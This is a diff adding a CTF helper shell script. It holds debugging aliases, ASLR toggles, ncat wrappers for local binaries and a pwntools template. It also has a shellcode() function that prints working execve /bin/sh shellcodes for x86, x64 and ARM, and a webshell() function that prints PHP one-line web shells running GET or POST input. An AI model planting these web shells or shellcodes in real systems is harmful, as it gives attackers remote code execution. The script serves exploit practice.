@@ -1,0 +1,153 @@
+#!/bin/sh
+# Lazy functions for ctf
+
+alias rgdb="gdb -ex 'target remote localhost:4444'"
+alias asm32="as -msyntax=intel --32 -mnaked-reg -aln -o /dev/null"
+alias asm64="as -msyntax=intel --64 -mnaked-reg -aln -o /dev/null"
+alias asmarm="arm-linux-gnueabi-as -aln -o /dev/null"
+alias asmaarch64="aarch64-linux-gnu-as -aln -o /dev/null"
+alias lddd="LD_TRACE_LOADED_OBJECTS=1"
+alias LOCALLIB="LD_LIBRARY_PATH=./"
+alias NOASLR="setarch `uname -m` -R "
+
+aslr()
+{
+    if [ $1 = "on" ]; then
+        sudo sysctl -w kernel.randomize_va_space=2
+    elif [ $1 = "off" ]; then
+        sudo sysctl -w kernel.randomize_va_space=0
+    else
+        cat /proc/sys/kernel/randomize_va_space
+    fi
+}
+
+syscall()
+{
+    grep -m 1 $1 "/usr/include/asm/unistd.h" "/usr/include/asm/unistd_32.h" "/usr/include/asm/unistd_64.h" 2>/dev/null
+}
+
+pxxd()
+{
+    xxd -p "$1" | awk -F '' '{ for(i=1; i<=NF; i+=2) {printf "\x%s%s", $i,$(i+1);}; printf "\n" }'
+}
+
+wgdb()
+{
+    pid=`pgrep -n $1`
+    while [ "$pid" = "" ]; do
+        pid=`pgrep -n $1`
+    done
+    echo "Attach to $1..."
+    gdb -ex continue -p $pid
+}
+
+ncat-local()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        ncat -vc $* -kl localhost 4000 
+    fi
+}
+
+ncat-strace()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        ncat -vc "strace -ix $*" -kl localhost 4000 
+    fi
+}
+
+ncat-ltrace()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        ncat -vc "ltrace -i $*" -kl localhost 4000 
+    fi
+}
+
+ncat-gdb()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        echo ${@: -1} listen on port 4000, gdbserver listen on port 4444
+        echo run \'gdb ${@: -1}\' then target remote localhost:4444 in gdb
+        echo ""
+
+        ncat -vc "gdbserver localhost:4444 $*" -kl localhost 4000 
+    fi
+}
+
+fuckalarm()
+{
+    if [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        sed s/alarm/isnan/g "$1" > $1"_noalarm"
+        chmod +x $1"_noalarm"
+    fi
+}
+
+fucksleep()
+{
+    if [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        sed s/sleep/isnan/g "$1" > $1"_nosleep"
+        chmod +x $1"_nosleep"
+    fi
+}
+
+pwn()
+{
+    if [ $# -eq 0 ]; then
+        echo "[!] Usage: pwn <filename>"
+    elif [ -f $1".py" ]; then
+        echo $1".py already exists!"
+    else
+        echo "#!/usr/bin/env python
+# encoding: utf-8
+
+from pwn import *   # pip install pwntools
+
+r = remote("localhost", 4000);
+
+
+r.interactive()" > 1.py
+    fi
+}
+
+shellcode()
+{
+    echo "# Linux/x86 execve /bin/sh shellcode 23 bytes"
+    echo "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+    echo "# Linux/x86 execve /bin/sh shellcode 25 bytes"
+    echo "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+
+    echo "# Linux x86 execve /bin/sh 28 bytes"
+    echo "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+    echo "# Linux/x64 execve /bin/sh shellcode 27 bytes"
+    echo "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+    echo "Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes"
+    echo "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+}
+
+webshell()
+{
+    echo "<?php $_GET[a]($_GET[b]);?>"
+    echo "<?php $_GET[a]($_GET[b]);?>"
+    echo "<?php eval($_POST[c]);?>"
+    
+}
+
+rsa-public()
+{
+    openssl rsa -noout -text -inform PEM -in ./$1 -pubin
+}
+
